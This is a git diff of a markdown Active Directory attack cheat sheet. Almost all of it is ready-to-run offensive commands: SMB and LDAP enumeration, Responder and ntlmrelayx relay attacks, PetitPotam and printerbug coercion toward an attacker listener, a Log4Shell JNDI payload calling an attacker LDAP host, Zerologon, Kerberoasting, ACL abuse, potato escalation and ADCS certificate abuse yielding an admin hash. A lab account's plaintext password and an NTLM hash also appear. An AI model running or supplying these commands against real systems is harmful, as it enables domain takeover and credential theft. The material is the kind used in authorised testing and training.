@@ -1,31 +1,26 @@
 
 ## Scanning
-
 ```bash
 cme smb <ip_range>
 nmap -PN -sV --top-ports 50
 ```
-
 ## Find DC IP
 ```bash
 nmcli dev show eth0 # show domain name & dns
 nslookup -type=SRV _ldap._tcp.dc._msdcs.<domain>
 nslookup -type=srv _kerberos._tcp.<domain>
 ```
-
 ## Shares
 ```bash
 cme smb <ip> -u '' -p '' # enumerate null session
 cme smb <ip> -u 'a' -p '' # enumerate anonymous access
 cme smb 192.168.1.0/24 --gen-relay-list relaylistOutputFilename.txt # scan for SMB signing not required
 ```
-
 ## Ldap
 ```bash
 nmap -n -sV --script "ldap* and not brute" -p 389 <dc-ip>
 ldapsearch -x -h <ip> -s base  
 crackmapexec ldap 10.10.11.181 -u d.klay -p 'Darkmoonsky248girl' -k --users
-
 ```
 ## Poisoning
 ```bash
@@ -36,9 +31,7 @@ responder -I eth0 (use --lm to force lm downgrade) # disable smb & http if rela
 ```bash
 PetitPotam.py  -d <domain> <listener_ip> <target_ip>
 ```
-
 # Low Hanging Fruits
-
 ## Zerologon
 ```bash
 zerologon-scan '<dc_netbios_name>' '<ip>'
@@ -54,12 +47,9 @@ ${jndi:ldap://<ip>:<port>/o=reference}
 ```bash
 use admin/mssql/mssql_enum_sql_logins
 ```
-
 # Valid Username
-
 ## Password Spray
 *Check password policy before you do any spraying!!*
-
 ```bash
 cme <IP> -u 'user' -p 'password' --pass-pol
 enum4linx -u 'username' -p 'password' -P <IP>
@@ -86,7 +76,6 @@ python GetNPUsers.py <domain>/ -usersfile <usernames.txt> -format hashcat -outpu
 ```
 ```bash
 impacket-GetNPUsers -dc-ip dc.absolute.htb -usersfile valid_users absolute.htb/
-
 ```
 ## Kerberoasting
 ```bash
@@ -95,7 +84,6 @@ GetUserSPNs.py -no-preauth "<asrep_user>" -usersfile "<user_list.txt>" -dc-host 
 GetUserSPNs.py -request -dc-ip "<dc_ip>" "<domain>"/"<user>" -outputfile "kerberoasted"
 ```
 # MITM
-
 ## Responder
 ```bash
 responder -I eth0 (use --lm to force lm downgrade)
@@ -111,9 +99,7 @@ ntlmrelayx.py --remove-mic --escalate-user <user> -t ldap://<dc_fqdn> -smb2suppo
 ntlmrelayx.py -t ldaps://<dc> --remove-mic --add-computer <computer_name> <computer_password> --delegate-access -smb2support   #RBCD
 ntlmrelayx -t ldap://<dc> --shadow-credentials --shadow-target '<dc>'  #Shadow Credentials https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/shadow-credentials
 ntlmrelayx.py  -wh <attacker_ip> -t ldap://<target> -l /tmp -6 -debug   #Users
-
 ```
-
 ## SMB unsigned
 ```bash
 Find it:
@@ -145,7 +131,6 @@ ntlmrelayx.py -t dcsync://<dc_02_ip> -smb2support -auth-smb <user>:<password>
 ```
 
 # Valid Credentials
-
 ## Bloodhound
 ```
 sharphound.exe -c all -d <domain>
@@ -171,7 +156,6 @@ certipy find -u <user>@<domain> -p <password> -dc-ip <domaincontroller>
 rpcdump.py <domain>/<user>:<password>@<domain_server> | grep MS-RPRN
 + 
 printerbug.py '<domain>/<username>:<password>'@<Printer IP> <listener_ip>
-
 
 PetitPotam.py  -d <domain> -u <user>-p <password> <listener_ip> <target_ip>
 coercer.py -u <user> -d <domain> -p <password> -t <target> -l <attacker_ip>
@@ -213,7 +197,7 @@ CVE-2021-36934 (HiveNightmare/SeriousSAM)
 service account (IIS/Mssql) (got SEImpersonate)
 RoguePotato
 Juicy Potato / Lovely Potato
-🔥 PrintSpoofer
+PrintSpoofer
 CertPotato
 ```
 ## Other exploits:
@@ -282,7 +266,6 @@ impersonate_token <domain>\\<user>
 
 cme smb <ip> -u <user> -p <password> -M impersonate 
 ```
-
 ## ACLs and ACEs permissions
 aclpwn.py - https://github.com/fox-it/aclpwn.py
 
@@ -304,14 +287,12 @@ ldeep ldap -u <user> -p <pwd> -d <domain> -s ldap://<dc> add_to_group "CN=<user>
 
 WriteOwner on Group -> WriteDACL + WriteOwner, Give yourself Generic all -> owneredit.py -> dacledit.py
 ```
-
 ## Computers
 ```
 GenericAll / GenericWrite
 -> msDs-AllowedToActOnBehalf > RBCD
 -> add Key Credentials > Shadow Credentials
 ```
-
 ## User
 ```
 GenericAll / GenericWrite
@@ -338,10 +319,8 @@ Get-DomainObjectAcl -SearchBase "CN=Policies,CN=System,DC=blah,DC=com" -ResolveG
 Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? {​​​​​​​​​​​​​ $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" }​​​​​​​​​​​​​ | select ObjectDN, SecurityIdentifier | fl
 
 ```
-
 # ADCS
 Web enrollment is up - ESC8 - can be easy domain admin
-
 
 You can also check if web enrollment is up via crackmapexec
 ```bash
@@ -355,9 +334,7 @@ Look for Domain Users in enrollment rights:
 ```text
  Enrollment Rights           : sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                       sequel\Domain Users           S-1-5-21-4078382237-1492182817-2568127209-513
-
 ```
-
 ## Certify
 Exploit with:
 ```powershell
@@ -385,12 +362,7 @@ If it worked, the result will have this:
        NTLM              : A52F78E4C751E5F5E17E1E9F3E58F4EE
 
 ```
-
 That is the admin hash.
-
-
-
-
 
 
 ## Certipy
